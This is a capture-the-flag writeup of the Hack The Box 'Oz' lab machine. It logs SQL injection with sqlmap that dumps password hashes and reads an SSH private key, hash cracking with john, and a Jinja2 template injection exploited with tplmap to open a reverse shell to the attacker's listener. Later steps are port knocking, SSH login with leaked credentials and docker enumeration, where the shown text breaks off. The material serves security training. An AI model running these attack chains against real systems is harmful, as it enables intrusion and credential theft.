---
layout: single
title: Oz - Hack The Box
date: 2019-01-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-oz/oz_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - linux
  - sqli
  - ssti
  - containers
---

This blog post is a writeup of the Oz machine from Hack the Box.

Linux / 10.10.10.96

![](/assets/images/htb-writeup-oz/oz_logo.png)

## Summary
- There's an SQL injection vulnerability on the port 80 application which allow us to dump the database
- We can crack the user credentials and log into the ticketing application
- An SSTI vulnerability allows us to gain RCE and access to this container
- Using the port-knocking information and SSH key we found earlier we can log in to the host OS
- The portainer application is exposed and we can use a vulnerability to change the admin password
- Once logged in, we use the portainer app to create a privileged container and get root access

### Tools/Blogs used

- [tplmap](https://github.com/epinna/tplmap)

## Detailed steps

Only ports 80 and 8080 are accessible on this box.

```
root@darkisland:~/hackthebox# nmap -p- -sC -sV 10.10.10.96
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-02 18:27 EDT
Nmap scan report for oz.htb (10.10.10.96)
Host is up (0.016s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
| http-title: GBR Support - Login
|_Requested resource was http://oz.htb:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.22 seconds
```

### Web enumeration

On port 8080 there's a simple login page.

![](/assets/images/htb-writeup-oz/2.png)

Failed attempts:
 - No SQL injections found on this page
 - Dirbusting didn't find any useful files or directories

On port 80 there's some web API asking for a username.

![](/assets/images/htb-writeup-oz/1.png)

Based on the HTML code, we can guess it's an API:

```html
<title>OZ webapi</title>
<h3>Please register a username!</h3>
```

Dirbusting is a bit more difficult than usual because the page randomly throws random strings in the response when we enumerate an invalid URI.

The returned message contains either the **register a username** messages or a random string.

![](/assets/images/htb-writeup-oz/3.png)

![](/assets/images/htb-writeup-oz/4.png)

![](/assets/images/htb-writeup-oz/5.png)

We can use wfuzz and exclude responses that include only 1 or 4 words:

```
root@darkisland:~/SecLists/Discovery/Web-Content# wfuzz -z file,raft-small-words-lowercase.txt --hw 1,4 10.10.10.96/FUZZ

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000199:  C=200      3 L	       6 W	     79 Ch	  "users"
...
```

So we found the `/users` URI, but we still get a 'Please register a username!' message but this time it's in bold letters so there is something different with that URI.

After trying a few parameters and URIs, we find that an 500 error is triggered when using the `http://10.10.10.96/users/'` URI.

This indicates a probable SQL injection. We can use sqlmap to explore this further:

```
root@darkisland:~# sqlmap -u http://10.10.10.96/users/
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.8#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:48:35

[18:48:36] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] 
[18:48:44] [INFO] testing connection to the target URL
[18:48:44] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[18:48:44] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] 
[18:48:45] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
[18:48:45] [INFO] testing if the target URL content is stable
[18:48:45] [INFO] target URL content is stable
[18:48:45] [INFO] testing if URI parameter '#1*' is dynamic
[18:48:45] [INFO] confirming that URI parameter '#1*' is dynamic
[18:48:45] [INFO] URI parameter '#1*' is dynamic
[18:48:45] [INFO] heuristics detected web page charset 'ascii'
[18:48:45] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:48:45] [INFO] testing for SQL injection on URI parameter '#1*'
[18:48:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:48:45] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[18:48:45] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:48:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:48:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:48:46] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:48:46] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[18:48:46] [INFO] testing 'MySQL inline queries'
[18:48:46] [INFO] testing 'PostgreSQL inline queries'
[18:48:46] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[18:48:46] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:48:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:48:46] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:48:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[18:48:46] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:48:47] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:48:47] [INFO] testing 'Oracle AND time-based blind'
[18:48:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:48:48] [INFO] target URL appears to be UNION injectable with 1 columns
[18:48:48] [WARNING] applying generic concatenation (CONCAT)
[18:48:48] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[18:48:48] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 121 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://10.10.10.96:80/users/' UNION ALL SELECT CONCAT(CONCAT('qbbqq','LTyCYJgVMHDgRhBJZQVYCtpRBHCImKTICLRjERMm'),'qqbvq')-- RRnL
---
[18:48:51] [INFO] testing MySQL
[18:48:51] [INFO] confirming MySQL
[18:48:51] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[18:48:51] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 52 times
[18:48:51] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.96'

[*] shutting down at 18:48:51
```

We found that the URI parameter is vulnerable so we can now enumerate the database content.

Databases:
```
root@darkisland:~# sqlmap -u http://10.10.10.96/users/ --dbs
[...]
available databases [4]:                                                                                                                                                                                          
[*] information_schema
[*] mysql
[*] ozdb
[*] performance_schema
```

MySQL credentials:
```
root@darkisland:~# sqlmap -u http://10.10.10.96/users/ --passwords
[...]
        9] [INFO] retrieved: "root","*61A2BD98DAD2A09749B6FC77A9578609D32518DD"
[18:50:29] [INFO] retrieved: "dorthi","*43AE542A63D9C43FF9D40D0280CFDA58F6C747CA"
[18:50:29] [INFO] retrieved: "root","*61A2BD98DAD2A09749B6FC77A9578609D32518DD"

```

Content of the ozdb database:
```
root@darkisland:~# sqlmap -u http://10.10.10.96/users/ -D ozdb --dump
[...]
+----+-------------+----------------------------------------------------------------------------------------+
| id | username    | password                                                                               |
+----+-------------+----------------------------------------------------------------------------------------+
| 1  | dorthi      | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 |
| 2  | tin.man     | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk |
| 3  | wizard.oz   | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY |
| 4  | coward.lyon | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY |
| 5  | toto        | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg |
| 6  | admin       | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ |
+----+-------------+----------------------------------------------------------------------------------------+
[...]
Database: ozdb                                                                                                                                                                                                    
Table: tickets_gbw
[12 entries]
+----+----------+--------------------------------------------------------------------------------------------------------------------------------+
| id | name     | desc                                                                                                                           |
+----+----------+--------------------------------------------------------------------------------------------------------------------------------+
| 1  | GBR-987  | Reissued new id_rsa and id_rsa.pub keys for ssh access to dorthi.                                                              |
| 2  | GBR-1204 | Where did all these damn monkey's come from!?  I need to call pest control.                                                    |
| 3  | GBR-1205 | Note to self: Toto keeps chewing on the curtain, find one with dog repellent.                                                  |
| 4  | GBR-1389 | Nothing to see here... V2hhdCBkaWQgeW91IGV4cGVjdD8=                                                                            |
| 5  | GBR-4034 | Think of a better secret knock for the front door.  Doesn't seem that secure, a Lion got in today.                             |
| 6  | GBR-5012 | I bet you won't read the next entry.                                                                                           |
| 7  | GBR-7890 | HAHA! Made you look.                                                                                                           |
| 8  | GBR-7945 | Dorthi should be able to find her keys in the default folder under /home/dorthi/ on the db.                                    |
| 9  | GBR-8011 | Seriously though, WW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4= |
| 10 | GBR-8042 | You are just wasting time now... someone else is getting user.txt                                                              |
| 11 | GBR-8457 | Look... now they've got root.txt and you don't even have user.txt                                                              |
| 12 | GBR-9872 | db information loaded to ticket application for shared db access                                                               |
+----+----------+--------------------------------------------------------------------------------------------------------------------------------+
```

Let's recap what we found:
 - MySQL hashes
 - OZDB users hashes
 - Hint about port knocking enabled on the server
 - Possible SSH keys available

Using the `--file-read` option, we quickly find that there is no user.txt we can read and that the MySQL runs in a container.

The `/etc/hosts` file gives it away, notice the randomly generated hostname which corresponds to the container ID.

```
root@darkisland:~# sqlmap -u http://10.10.10.96/users/ --file-read=/etc/hosts
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.8#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:53:35

[18:53:35] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] 
[18:53:36] [INFO] resuming back-end DBMS 'mysql' 
[18:53:36] [INFO] testing connection to the target URL
[18:53:36] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://10.10.10.96:80/users/' UNION ALL SELECT CONCAT(CONCAT('qbbqq','LTyCYJgVMHDgRhBJZQVYCtpRBHCImKTICLRjERMm'),'qqbvq')-- RRnL
---
[18:53:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 5 (MariaDB fork)
[18:53:36] [INFO] fingerprinting the back-end DBMS operating system
[18:53:36] [INFO] the back-end DBMS operating system is Linux
[18:53:36] [INFO] fetching file: '/etc/hosts'
do you want confirmation that the remote file '/etc/hosts' has been successfully downloaded from the back-end DBMS file system? [Y/n] 
[18:53:36] [INFO] the local file '/root/.sqlmap/output/10.10.10.96/files/_etc_hosts' and the remote file '/etc/hosts' have the same size (175 B)
files saved to [1]:
[*] /root/.sqlmap/output/10.10.10.96/files/_etc_hosts (same file)

[18:53:36] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.96'

[*] shutting down at 18:53:36

root@darkisland:~# cat /root/.sqlmap/output/10.10.10.96/files/_etc_hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
10.100.10.4	b9b370edd41a
```

That's a dead end, next let's grab the SSH keys:

```
root@darkisland:~/oz#sqlmap -u http://10.10.10.96/users/ --file-read=/home/dorthi/.ssh/id_rsa
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:57:23

[18:57:23] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] 
[18:57:24] [INFO] resuming back-end DBMS 'mysql' 
[18:57:24] [INFO] testing connection to the target URL
[18:57:24] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://10.10.10.96:80/users/' UNION ALL SELECT CONCAT(CONCAT('qbbqq','LTyCYJgVMHDgRhBJZQVYCtpRBHCImKTICLRjERMm'),'qqbvq')-- RRnL
---
[18:57:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 5 (MariaDB fork)
[18:57:24] [INFO] fingerprinting the back-end DBMS operating system
[18:57:24] [INFO] the back-end DBMS operating system is Linux
[18:57:24] [INFO] fetching file: '/home/dorthi/.ssh/id_rsa'
do you want confirmation that the remote file '/home/dorthi/.ssh/id_rsa' has been successfully downloaded from the back-end DBMS file system? [Y/n] 
[18:57:24] [INFO] the local file '/root/.sqlmap/output/10.10.10.96/files/_home_dorthi_.ssh_id_rsa' and the remote file '/home/dorthi/.ssh/id_rsa' have the same size (1766 B)
files saved to [1]:
[*] /root/.sqlmap/output/10.10.10.96/files/_home_dorthi_.ssh_id_rsa (same file)

[18:57:24] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.96'

[*] shutting down at 18:57:24

root@darkisland:~/oz# cat /root/.sqlmap/output/10.10.10.96/files/_home_dorthi_.ssh_id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,66B9F39F33BA0788CD27207BF8F2D0F6

RV903H6V6lhKxl8dhocaEtL4Uzkyj1fqyVj3eySqkAFkkXms2H+4lfb35UZb3WFC
b6P7zYZDAnRLQjJEc/sQVXuwEzfWMa7pYF9Kv6ijIZmSDOMAPjaCjnjnX5kJMK3F
e1BrQdh0phWAhhUmbYvt2z8DD/OGKhxlC7oT/49I/ME+tm5eyLGbK69Ouxb5PBty
h9A+Tn70giENR/ExO8qY4WNQQMtiCM0tszes8+guOEKCckMivmR2qWHTCs+N7wbz
a//JhOG+GdqvEhJp15pQuj/3SC9O5xyLe2mqL1TUK3WrFpQyv8lXartH1vKTnybd
9+Wme/gVTfwSZWgMeGQjRXWe3KUsgGZNFK75wYtA/F/DB7QZFwfO2Lb0mL7Xyzx6
ZakulY4bFpBtXsuBJYPNy7wB5ZveRSB2f8dznu2mvarByMoCN/XgVVZujugNbEcj
evroLGNe/+ISkJWV443KyTcJ2iIRAa+BzHhrBx31kG//nix0vXoHzB8Vj3fqh+2M
EycVvDxLK8CIMzHc3cRVUMBeQ2X4GuLPGRKlUeSrmYz/sH75AR3zh6Zvlva15Yav
5vR48cdShFS3FC6aH6SQWVe9K3oHzYhwlfT+wVPfaeZrSlCH0hG1z9C1B9BxMLQr
DHejp9bbLppJ39pe1U+DBjzDo4s6rk+Ci/5dpieoeXrmGTqElDQi+KEU9g8CJpto
bYAGUxPFIpPrN2+1RBbxY6YVaop5eyqtnF4ZGpJCoCW2r8BRsCvuILvrO1O0gXF+
wtsktmylmHvHApoXrW/GThjdVkdD9U/6Rmvv3s/OhtlAp3Wqw6RI+KfCPGiCzh1V
0yfXH70CfLO2NcWtO/JUJvYH3M+rvDDHZSLqgW841ykzdrQXnR7s9Nj2EmoW72IH
znNPmB1LQtD45NH6OIG8+QWNAdQHcgZepwPz4/9pe2tEqu7Mg/cLUBsTYb4a6mft
icOX9OAOrcZ8RGcIdVWtzU4q2YKZex4lyzeC/k4TAbofZ0E4kUsaIbFV/7OMedMC
zCTJ6rlAl2d8e8dsSfF96QWevnD50yx+wbJ/izZonHmU/2ac4c8LPYq6Q9KLmlnu
vI9bLfOJh8DLFuqCVI8GzROjIdxdlzk9yp4LxcAnm1Ox9MEIqmOVwAd3bEmYckKw
w/EmArNIrnr54Q7a1PMdCsZcejCjnvmQFZ3ko5CoFCC+kUe1j92i081kOAhmXqV3
c6xgh8Vg2qOyzoZm5wRZZF2nTXnnCQ3OYR3NMsUBTVG2tlgfp1NgdwIyxTWn09V0
nOzqNtJ7OBt0/RewTsFgoNVrCQbQ8VvZFckvG8sV3U9bh9Zl28/2I3B472iQRo+5
uoRHpAgfOSOERtxuMpkrkU3IzSPsVS9c3LgKhiTS5wTbTw7O/vxxNOoLpoxO2Wzb
/4XnEBh6VgLrjThQcGKigkWJaKyBHOhEtuZqDv2MFSE6zdX/N+L/FRIv1oVR9VYv
QGpqEaGSUG+/TSdcANQdD3mv6EGYI+o4rZKEHJKUlCI+I48jHbvQCLWaR/bkjZJu
XtSuV0TJXto6abznSC1BFlACIqBmHdeaIXWqH+NlXOCGE8jQGM8s/fd/j5g1Adw3
-----END RSA PRIVATE KEY-----
```

That private key is encrypted, we'll need to extract the hash and convert it to a john format:

```
root@darkisland:~/oz# ssh2john hash.txt > hash
root@darkisland:~/oz# cat hash
hash.txt:$ssh2$2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c36364239463339463333424130373838434432373230374246384632443046360a0a5256393033483656366c684b786c3864686f636145744c34557a6b796a31667179566a33657953716b41466b6b586d7332482b346c66623335555a62335746430a623650377a595a44416e524c516a4a45632f735156587577457a66574d6137705946394b7636696a495a6d53444f4d41506a61436a6e6a6e58356b4a4d4b33460a6531427251646830706857416868556d62597674327a3844442f4f474b68786c43376f542f3439492f4d452b746d3565794c47624b36394f75786235504274790a6839412b546e37306769454e522f45784f38715934574e51514d7469434d3074737a6573382b67754f454b43636b4d69766d52327157485443732b4e3777627a0a612f2f4a684f472b4764717645684a7031357051756a2f335343394f3578794c65326d714c3154554b3357724670517976386c586172744831764b546e7962640a392b576d652f6756546677535a57674d6547516a52585765334b557367475a4e464b3735775974412f462f444237515a4677664f324c62306d4c3758797a78360a5a616b756c59346246704274587375424a59504e79377742355a7665525342326638647a6e75326d76617242794d6f434e2f586756565a756a75674e6245636a0a6576726f4c474e652f2b49536b4a57563434334b7954634a3269495241612b427a486872427833316b472f2f6e69783076586f487a4238566a336671682b324d0a457963567644784c4b3843494d7a486333635256554d42655132583447754c5047524b6c556553726d597a2f734837354152337a68365a766c766131355961760a3576523438636453684653334643366148365351575665394b336f487a5968776c66542b7756506661655a72536c4348306847317a394331423942784d4c51720a4448656a703962624c70704a3339706531552b44426a7a446f347336726b2b43692f35647069656f6558726d475471456c4451692b4b4555396738434a70746f0a6259414755785046497050724e322b315242627859365956616f7035657971746e46345a47704a436f4357327238425273437675494c76724f314f306758462b0a7774736b746d796c6d48764841706f5872572f4754686a64566b644439552f36526d767633732f4f68746c4170335771773652492b4b6643504769437a6831560a3079665848373043664c4f324e6357744f2f4a554a765948334d2b72764444485a534c716757383431796b7a647251586e523773394e6a32456d6f57373249480a7a6e4e506d42314c51744434354e48364f4947382b51574e4164514863675a657077507a342f3970653274457175374d672f634c5542735459623461366d66740a69634f58394f414f72635a3852476349645657747a55347132594b5a6578346c797a65432f6b345441626f665a3045346b557361496246562f374f4d65644d430a7a43544a36726c416c326438653864735366463936515765766e44353079782b77624a2f697a5a6f6e486d552f3261633463384c5059713651394b4c6d6c6e750a764939624c664f4a6838444c46757143564938477a524f6a496478646c7a6b397970344c7863416e6d314f78394d4549716d4f567741643362456d59636b4b770a772f456d41724e49726e72353451376131504d6443735a63656a436a6e766d51465a336b6f35436f4643432b6b5565316a3932693038316b4f41686d587156330a633678676838566732714f797a6f5a6d3577525a5a46326e54586e6e4351334f5952334e4d73554254564732746c676670314e67647749797854576e303956300a6e4f7a714e744a374f4274302f526577547346676f4e5672435162513856765a46636b76473873563355396268395a6c32382f324933423437326951526f2b350a756f5248704167664f534f45527478754d706b726b5533497a53507356533963334c674b68695453357754625477374f2f7678784e4f6f4c706f784f32577a620a2f34586e4542683656674c726a54685163474b69676b574a614b7942484f684574755a714476324d465345367a64582f4e2b4c2f46524976316f5652395659760a514770714561475355472b2f54536463414e516444336d7636454759492b6f34725a4b45484a4b556c43492b4934386a48627651434c5761522f626b6a5a4a750a587453755630544a58746f3661627a6e53433142466c41434971426d4864656149585771482b4e6c584f434745386a51474d38732f66642f6a356731416477330a2d2d2d2d2d454e44205253412050524956415445204b45592d2d2d2d2d0a*1766*0
```

### Cracking hashes

The only hash we are able to crack amongst all the stuff we recovered from MySQL and the SSH key is the `wizard.oz` account from the ozdb database:

```
root@darkisland:~/oz# john -w=/usr/share/wordlists/rockyou.txt users.txt --fork=4
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (PBKDF2-HMAC-SHA256 [PBKDF2-SHA256 128/128 AVX 4x])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
3 0g 0:00:44:19 2.46% (ETA: 2018-09-04 01:09) 0g/s 38.70p/s 232.2c/s 232.2C/s johansen1..joeyy
2 0g 0:00:44:19 2.47% (ETA: 2018-09-04 01:08) 0g/s 38.72p/s 232.3c/s 232.3C/s jinsu..jing21
4 0g 0:00:44:19 2.46% (ETA: 2018-09-04 01:10) 0g/s 38.69p/s 232.1c/s 232.1C/s johnpaul12..johnny43
1 0g 0:00:44:19 2.47% (ETA: 2018-09-04 01:08) 0g/s 38.72p/s 232.3c/s 232.3C/s jmedina..jlucky
```

Password found: `wizard.oz` / `wizardofoz22`

### Ticketing application

Once logged in with the `wizard.oz` account we can see the existing tickets and create new ones.

![](/assets/images/htb-writeup-oz/8.png)

Unfortunately the creation of new tickets doesn't seem to work; when we submit a new ticket is just brings us back to the tickets list.

![](/assets/images/htb-writeup-oz/9.png)

![](/assets/images/htb-writeup-oz/10.png)

If we use Burp to look at the POST response, we see that the name and description is echoed back to us. If we send a payload with curly braces, we trigger a different response where the math operation inside is executed so we know we are looking at a Service Side Template Injection (SSTI) vulnerability.

![](/assets/images/htb-writeup-oz/11.png)

To exploit the SSTI vulnerability we will use the [tplmap](https://github.com/epinna/tplmap) utility.

```
root@darkisland:~/tplmap# python tplmap.py -c "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTUzNTkzMTQ2MX0.3x2jmednxdT4PkLgaqV_wDRqy7AjowugPnpbJsMLCnc" -u http://10.10.10.96:8080 -e Jinja2 -d "name=param1&desc=param2"
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Jinja2 plugin has confirmed blind injection
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Jinja2
  Injection: *
  Context: text
  OS: undetected
  Technique: blind
  Capabilities:

   Shell command execution: ok (blind)
   Bind and reverse shell: ok
   File write: ok (blind)
   File read: no
   Code evaluation: ok, python code (blind)

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd			Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
```

Let's get a shell with the `--reverse-shell` parameter:

```
root@darkisland:~/tplmap# python tplmap.py -c "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTUzNTkzMTQ2MX0.3x2jmednxdT4PkLgaqV_wDRqy7AjowugPnpbJsMLCnc" -u http://10.10.10.96:8080 -e Jinja2 -d "name=param1&desc=param2" --reverse-shell 10.10.14.23 4444
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Jinja2 plugin has confirmed blind injection
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Jinja2
  Injection: *
  Context: text
  OS: undetected
  Technique: blind
  Capabilities:

   Shell command execution: ok (blind)
   Bind and reverse shell: ok
   File write: ok (blind)
   File read: no
   Code evaluation: ok, python code (blind)
[...]

root@darkisland:~# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.96] 35807
/bin/sh: can't access tty; job control turned off
/app #
```

### Inside the ticket app container

The port knocking sequence can be found in the `/.secret` directory:

```
/app # ls -la /.secret
total 12
drwxr-xr-x    2 root     root          4096 Apr 24 18:27 .
drwxr-xr-x   53 root     root          4096 May 15 17:24 ..
-rw-r--r--    1 root     root           262 Apr 24 18:27 knockd.conf
/app # cat /.secret/knockd.conf
[options]
	logfile = /var/log/knockd.log

[opencloseSSH]

	sequence	= 40809:udp,50212:udp,46969:udp
	seq_timeout	= 15
	start_command	= ufw allow from %IP% to any port 22
	cmd_timeout	= 10
	stop_command	= ufw delete allow from %IP% to any port 22
	tcpflags	= syn
```

The MySQL credentials are also found in `/containers/database/start.sh`

```
/containers/database # cat start.sh
#!/bin/bash

docker run -d -v /connect/mysql:/var/lib/mysql --name ozdb \
--net prodnet --ip 10.100.10.4 \
-e MYSQL_ROOT_PASSWORD=SuP3rS3cr3tP@ss \
-e MYSQL_USER=dorthi \
-e MYSQL_PASSWORD=N0Pl4c3L1keH0me \
-e MYSQL_DATABASE=ozdb \
-v /connect/sshkeys:/home/dorthi/.ssh/:ro \
-v /dev/null:/root/.bash_history:ro \
-v /dev/null:/root/.ash_history:ro \
-v /dev/null:/root/.sh_history:ro \
--restart=always \
mariadb:5.5
```

### Access to the host OS

First, we open port 22 using the port-knock sequence:
```
../knock/knock -u 10.10.10.96 40809 50212 46969
```

The we can log in as `dorthi` with the MySQL password `N0Pl4c3L1keH0me`:
```
root@darkisland:~/oz# ssh -i id_rsa dorthi@10.10.10.96
Enter passphrase for key 'id_rsa': 
dorthi@Oz:~$ cat user.txt
c21cf<redacted>
```

### Privilege Escalation

We can check the docker networks according to sudoers:
```
dorthi@Oz:~$ sudo -l
Matching Defaults entries for dorthi on Oz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dorthi may run the following commands on Oz:
    (ALL) NOPASSWD: /usr/bin/docker network inspect *
    (ALL) NOPASSWD: /usr/bin/docker network ls
```

```
dorthi@Oz:~$ sudo /usr/bin/docker network ls
NETWORK ID          NAME                DRIVER              SCOPE
de829e486722        bridge              bridge              local
49c1b0c16723        host                host                local
3ccc2aa17acf        none                null                local
48148eb6a512        prodnet             bridge              local
```

```
dorthi@Oz:~$ sudo /usr/bin/docker network inspect prodnet
[
    {
        "Name": "prodnet",
        "Id": "48148eb6a512cd39f249c75f7acc91e0ac92d9cc9eecb028600d76d81199893f",
        "Created": "2018-04-25T15:33:00.533183631-05:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": {},
            "Config": [
                {
                    "Subnet": "10.100.10.0/29",
                    "Gateway": "10.100.10.1"
                }
            ]
        },
        "Internal": false,
        "Attachable": false,
        "Containers": {
            "139ba9457f1a630ee3a072693999c414901d7df49ab8a70b926d246f9ca6cc69": {
                "Name": "webapi",
                "EndpointID": "9d9d439314e66dcbe6fa38eb32941e4cc31c9dbfc843afbb0008ca017a540e05",
                "MacAddress": "02:42:0a:64:0a:06",
                "IPv4Address": "10.100.10.6/29",
                "IPv6Address": ""
            },
            "b9b370edd41a9d3ae114756d306f2502c420f48a4d7fbe36ae31bc18cf7ddb7c": {
                "Name": "ozdb",
                "EndpointID": "91b4ca1f31762f7e55208b74e5316839609fa0c77bc53aa7a92402827fbba05d",
                "MacAddress": "02:42:0a:64:0a:04",
                "IPv4Address": "10.100.10.4/29",
                "IPv6Address": ""
            },
